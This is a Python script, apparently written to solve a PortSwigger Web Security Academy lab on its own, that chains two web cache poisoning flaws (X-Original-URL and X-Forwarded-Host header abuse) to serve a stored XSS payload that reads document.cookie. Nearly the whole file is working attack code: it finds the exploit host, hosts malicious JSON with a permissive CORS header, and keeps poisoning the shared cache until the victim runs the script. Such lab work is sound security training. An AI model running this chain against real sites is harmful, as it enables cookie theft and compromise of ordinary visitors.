#!/usr/bin/env python3
"""
Autonomous solver: PortSwigger Web Security Academy
  Lab: "Combining web cache poisoning vulnerabilities" (EXPERT)

Usage:
    uv run python solve.py --url "https://<LAB_ID>.web-security-academy.net"

Objective
---------
Poison the shared cache so that the (English-speaking) visitor, who hits the
home page ~once a minute, receives a response that executes
`alert(document.cookie)` in their browser.

Why it is a "complex exploit chain" (verified empirically)
----------------------------------------------------------
The CDN cache key is the *request-line* path + query string only. Two unkeyed
request headers let us change the *body* the back-end returns for a given key:

  1. `X-Original-URL: /setlang\\es`  (backslash!)
     The back-end routes on X-Original-URL. `/setlang\\es` (backslash) is an
     unknown route, so the back-end answers a *cacheable* 302 -> `/setlang/es`
     (no Set-Cookie). The front-end stores that 302 under the request-line key
     `/`. => the English visitor's `GET /` becomes a 302 to `/setlang/es`.

  2. `X-Forwarded-Host: <exploit-host>`
     Reflected into the page HTML's `data = {"host": "<X-Forwarded-Host>", ...}`.
     `translations.js` then fetches `//<host>/resources/json/translations.json`.
     Pointing it at our exploit server makes the victim load OUR JSON.

The victim chain:
  GET /            -> (poisoned) 302 /setlang/es
  GET /setlang/es  -> Set-Cookie: lang=es ; 302 /?localized=1   (not cached)
  GET /?localized=1-> (poisoned) home page whose data.host = exploit server
                     -> browser fetches //exploit/.../translations.json (CORS *)
                     -> translate() rewrites the "View details" <a> innerHTML to
                        <img src=x onerror=alert(document.cookie)>  -> XSS.

Only NON-English pages run translate(), which is why we force lang=es via the
redirect. The English visitor is thus coerced into a Spanish page that loads
our payload.

Solved-state detection (verified empirically)
---------------------------------------------
The lab home page and /?localized=1 are cached for max-age=30 and are the very
pages we continuously poison, so their status widget is STALE for up to ~30s
after the visitor actually solves the lab. The exploit server's status widget
is on a separate, non-lab-cached host and flips promptly. We therefore gate
detection on the exploit server and do the on-lab-host confirmation with a
cache-busted fetch (unique query => origin fetch), never on the cached page.

Nothing below is hardcoded to a lab instance: the lab host comes from --url and
the exploit-server URL is discovered from the home page HTML.
"""

from __future__ import annotations

import argparse
import json
import re
import sys
import time
import urllib.parse
from collections import namedtuple

import requests

# --- tunables -------------------------------------------------------------
LOOP_SLEEP_S = 0.12          # pause between poison-loop iterations
SOLVED_POLL_S = 5.0          # how often to poll the solved status
DEFAULT_TIMEOUT_S = 200.0    # max seconds to wait for the lab visitor
REQ_TIMEOUT_S = 20           # per-HTTP-request timeout

# Malicious translations.json served by the exploit server.
# translate() does `el.innerHTML = dict[k]` when el.innerHTML === k, so a
# translation *value* containing an event-handler tag is executed as HTML.
# "View details" appears in every product tile on the home page.
XSS_PAYLOAD = '<img src=x onerror=alert(document.cookie)>'
MALICIOUS_JSON = {
    "en": {"name": "English"},
    "es": {
        "name": "espa\u00f1ol",
        "translations": {
            "Return to list": "Volver a la lista",
            "View details": XSS_PAYLOAD,
            "Description:": "Descripci\u00f3n:",
        },
    },
}


class Stats:
    """Count every HTTP request and track wall-clock time."""

    def __init__(self) -> None:
        self.requests = 0
        self.bytes = 0
        self.start = time.time()

    def tick(self, n: int = 1) -> None:
        self.requests += n

    def elapsed(self) -> float:
        return time.time() - self.start


class Solver:
    def __init__(self, lab_url: str, timeout: float, verbose: bool = True,
                 exploit_url: str = "") -> None:
        self.lab_url = lab_url.rstrip("/")
        self.timeout = timeout
        self.v = verbose
        self.stats = Stats()
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "Mozilla/5.0 (Hermes solver)"})
        self.lab_host: str = ""
        self.exploit_host: str = ""
        self.exploit_url = (exploit_url or "").rstrip("/")
        self.solved = False
        self.poison_verified = False
        self.lab_confirmed = False   # fresh (cache-busted) lab-page confirmation

    # -- logging -----------------------------------------------------------
    def log(self, *a, **k) -> None:
        if self.v:
            print(f"[{time.strftime('%H:%M:%S')}]", *a, **k, flush=True)

    def _get(self, url: str, **kw) -> requests.Response:
        self.stats.tick()
        return self.session.get(url, timeout=REQ_TIMEOUT_S, **kw)

    def _post(self, url: str, **kw) -> requests.Response:
        self.stats.tick()
        return self.session.post(url, timeout=REQ_TIMEOUT_S, **kw)

    # -- phase 1: recon ----------------------------------------------------
    def _find_exploit_link(self, html: str) -> str | None:
        m = re.search(r"https://(exploit-[^/\"]+\.exploit-server\.net)", html)
        return m.group(1) if m else None

    def recon(self) -> None:
        self.log("Phase 1: recon ->", self.lab_url)
        self.lab_host = urllib.parse.urlsplit(self.lab_url).netloc
        if not self.exploit_url:
            # The "Go to exploit server" link is in the lab header on every page
            # while the lab is still unsolved. Search a couple of pages.
            found = None
            for path in ("/", "/?localized=1", "/product?productId=1"):
                r = self._get(self.lab_url + path)
                found = self._find_exploit_link(r.text)
                if "is-solved" in r.text:
                    self.log("  NOTE: lab already reports SOLVED on", path)
                if found:
                    break
            if not found:
                raise RuntimeError(
                    "could not discover exploit-server URL (lab header shows no "
                    "'Go to exploit server' link, i.e. the lab is already solved); "
                    "re-run on a fresh instance or pass --exploit")
            self.exploit_host = found
            self.exploit_url = "https://" + found
        else:
            self.exploit_host = urllib.parse.urlsplit(self.exploit_url).netloc
        self.log("  lab host      :", self.lab_host)
        self.log("  exploit server:", self.exploit_url)

    # -- phase 2: configure exploit server --------------------------------
    def configure_exploit_server(self) -> None:
        self.log("Phase 2: configure exploit server payload")
        body = json.dumps(MALICIOUS_JSON)
        head = (
            "HTTP/1.1 200 OK\n"
            "Content-Type: application/json; charset=utf-8\n"
            "Access-Control-Allow-Origin: *\n"
        )
        resp = self._post(
            self.exploit_url + "/",
            data={
                "urlIsHttps": "on",
                "responseFile": "/resources/json/translations.json",
                "responseHead": head,
                "responseBody": body,
                "formAction": "STORE",
            },
        )
        self.log("  STORE response:", resp.status_code)
        # verify it is served with the right path + CORS header
        chk = self._get(self.exploit_url + "/resources/json/translations.json")
        ok = (
            chk.status_code == 200
            and chk.headers.get("access-control-allow-origin") == "*"
            and XSS_PAYLOAD in chk.text
        )
        self.log("  exploit JSON served:", chk.status_code,
                 "| CORS *:", chk.headers.get("access-control-allow-origin"),
                 "| payload present:", XSS_PAYLOAD in chk.text)
        if not ok:
            raise RuntimeError("exploit server did not serve the malicious JSON correctly")

    # -- poison one cache entry (idempotent) ------------------------------
    def _poison(self) -> None:
        # allow_redirects=False is essential: requests re-sends custom headers on
        # redirect follow-ups, which would loop the X-Original-URL 302.
        # '/'  -> 302 to /setlang/es (cacheable, via backslash in X-Original-URL)
        self._get(self.lab_url + "/", headers={"X-Original-URL": "/setlang\\es"},
                  allow_redirects=False)
        # '/?localized=1' -> home page whose data.host points at the exploit server
        self._get(self.lab_url + "/?localized=1",
                  headers={"X-Forwarded-Host": self.exploit_host},
                  allow_redirects=False)

    def _verify_poisoned(self) -> bool:
        # '/' should now be a 302 (cached). Use allow_redirects=False to see it.
        self.stats.tick()
        r = self.session.get(self.lab_url + "/", allow_redirects=False, timeout=REQ_TIMEOUT_S)
        slash_ok = r.status_code == 302 and "/setlang/es" in (r.headers.get("location") or "")
        self.stats.tick()
        r2 = self.session.get(self.lab_url + "/?localized=1", timeout=REQ_TIMEOUT_S)
        loc_ok = self.exploit_host in (r2.text or "")
        self.log("    verify: / ->", r.status_code, r.headers.get("location"),
                 "| /?localized=1 data.host=exploit:", loc_ok)
        return slash_ok and loc_ok

    def _check_solved(self) -> tuple[bool, bool]:
        """Return (solved, lab_confirmed).

        `solved` gates on the EXPLOIT SERVER status widget — a separate host that is
        NOT lab-cached, so it flips the moment the visitor fires the alert. Gating on
        the lab's own home page instead would lag up to the 30s cache TTL (that page
        is continuously poisoned and only re-flips after the origin is solved AND the
        cache entry is re-fetched), which is what caused the "still not solved" delay.

        `lab_confirmed` is a cache-busted lab fetch (unique query => origin fetch,
        bypassing the 30s poisoned cache) — fresh, so it reflects the current state
        and gives independent on-the-lab-host evidence. It is reported, not the gate.
        """
        self.stats.tick()
        es = self.session.get(self.exploit_url + "/", timeout=REQ_TIMEOUT_S).text
        solved = "is-solved" in es and "<p>Solved</p>" in es
        lab_confirmed = False
        if solved:
            try:
                self.stats.tick()
                cb = self.session.get(
                    self.lab_url + "/?cb=" + str(int(time.time() * 1000)),
                    timeout=REQ_TIMEOUT_S).text
                lab_confirmed = "is-solved" in cb and "<p>Solved</p>" in cb
            except Exception:  # noqa: BLE001
                pass
        return solved, lab_confirmed

    # -- phase 3: poison loop + poll --------------------------------------
    def run(self) -> bool:
        self.recon()
        self.configure_exploit_server()

        self.log(f"Phase 3: poison loop (max {self.timeout:.0f}s); "
                 f"visitor arrives ~once/min, cache TTL 30s")
        loop_end = time.time() + self.timeout
        next_poll = time.time() + SOLVED_POLL_S
        verify_in = time.time() + 3.0

        while time.time() < loop_end:
            # keep poisoning; a transient network error on one iteration must not
            # kill the whole run (the lab/visitor solved-state is sticky — we retry).
            try:
                self._poison()
            except requests.exceptions.RequestException as e:
                self.log("  [warn] poison request error (continuing):", repr(e)[:140])
            # occasionally confirm both cache entries are actually poisoned
            if time.time() >= verify_in:
                try:
                    if self._verify_poisoned():
                        self.poison_verified = True
                        self.log("  [ok] both cache entries poisoned "
                                 "(/ -> 302 /setlang/es ; /?localized=1 -> data.host=exploit)")
                except requests.exceptions.RequestException as e:
                    self.log("  [warn] poison-verify error (continuing):", repr(e)[:140])
                verify_in = time.time() + 8.0
            if time.time() >= next_poll:
                try:
                    solved, lab_confirmed = self._check_solved()
                except requests.exceptions.RequestException as e:
                    self.log("  [warn] status-poll error (continuing):", repr(e)[:140])
                    solved, lab_confirmed = False, False
                if solved:
                    self.solved = True
                    self.lab_confirmed = lab_confirmed
                    self.log(f"  *** LAB SOLVED after {self.stats.elapsed():.1f}s *** "
                             f"(lab page confirms solved: {lab_confirmed})")
                    break
                self.log(f"  ... still not solved ({self.stats.elapsed():.0f}s), "
                         f"requests={self.stats.requests}")
                next_poll = time.time() + SOLVED_POLL_S
            time.sleep(LOOP_SLEEP_S)

        if not self.solved:
            # final poll in case it flipped in the last instant (resilient)
            try:
                solved, lab_confirmed = self._check_solved()
                self.solved = solved
                self.lab_confirmed = lab_confirmed
            except requests.exceptions.RequestException as e:
                self.log("  [warn] final status-poll error:", repr(e)[:140])

        # final authoritative confirmation: exploit server (timely, authoritative) +
        # a cache-busted lab fetch (fresh on-the-lab-host evidence). The loop already
        # detected the solve authoritatively (exploit server is-solved is sticky);
        # transient errors here must not un-solve it.
        if self.solved:
            es_ok = None
            try:
                self.stats.tick()
                es = self.session.get(self.exploit_url + "/", timeout=REQ_TIMEOUT_S).text
                es_ok = "is-solved" in es and "<p>Solved</p>" in es
            except requests.exceptions.RequestException as e:
                self.log("  [warn] final exploit-server check error:", repr(e)[:140])
            try:
                self.stats.tick()
                cb = self.session.get(
                    self.lab_url + "/?cb=" + str(int(time.time() * 1000)),
                    timeout=REQ_TIMEOUT_S).text
                self.lab_confirmed = "is-solved" in cb and "<p>Solved</p>" in cb
            except requests.exceptions.RequestException as e:
                self.log("  [warn] final lab check error:", repr(e)[:140])
            # Only downgrade if a re-check SUCCEEDED and reported not-solved.
            if es_ok is False:
                self.solved = False
            self.log("  final: exploit-server is-solved:", es_ok,
                     "| lab page (cache-busted) is-solved:", self.lab_confirmed)

        return self.solved

    def summary(self) -> None:
        self.log("---- SUMMARY ----")
        self.log("  result               :", "SOLVED" if self.solved else "NOT solved")
        self.log("  poison state verified:", self.poison_verified)
        self.log("  lab page confirms    :", self.lab_confirmed)
        self.log("  wall-clock time      :", f"{self.stats.elapsed():.2f}s")
        self.log("  total HTTP requests  :", self.stats.requests)
        self.log("  lab host             :", self.lab_host)
        self.log("  exploit server       :", self.exploit_url)


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url", required=True, help="Full lab URL, e.g. https://<id>.web-security-academy.net")
    ap.add_argument("--exploit", default="",
                    help="Optional exploit-server base URL (auto-discovered from the "
                         "lab header while the lab is unsolved; pass this on re-runs "
                         "where the lab is already solved).")
    ap.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT_S,
                    help=f"Max seconds to wait for the visitor (default {DEFAULT_TIMEOUT_S:.0f})")
    ap.add_argument("--quiet", action="store_true", help="suppress per-step logging")
    args = ap.parse_args()

    t0 = time.time()
    solver = Solver(args.url, args.timeout, verbose=not args.quiet,
                    exploit_url=args.exploit)
    try:
        solved = solver.run()
    except Exception as e:  # noqa: BLE001
        solver.log("ERROR:", repr(e))
        solver.summary()
        return 2
    solver.summary()
    print(json.dumps({
        "solved": solved,
        "elapsed_s": round(time.time() - t0, 2),
        "requests": solver.stats.requests,
        "lab": solver.lab_host,
        "exploit": solver.exploit_host,
        "poison_verified": solver.poison_verified,
        "lab_confirmed": solver.lab_confirmed,
    }))
    return 0 if solved else 1


if __name__ == "__main__":
    sys.exit(main())
